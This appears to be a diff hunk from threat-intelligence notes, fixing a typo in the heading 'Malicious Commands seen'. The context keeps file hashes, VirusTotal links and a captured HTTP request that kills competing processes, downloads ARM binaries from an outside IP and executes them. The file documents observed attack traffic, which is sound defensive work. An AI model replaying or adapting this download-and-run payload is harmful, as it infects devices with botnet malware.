@@ -18,7 +18,7 @@ https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46
 d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 GET /shell?pidof+arm7+|+grep+arm7+|+xargs+kill+-9;ps+arm+|+xargs+kill+-9;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.28.33.96/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;wget+http:/\\/103.28.33.96/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;rm+-rf+most* HTTP/1.1
 user-Agent: KrebsOnSecurity
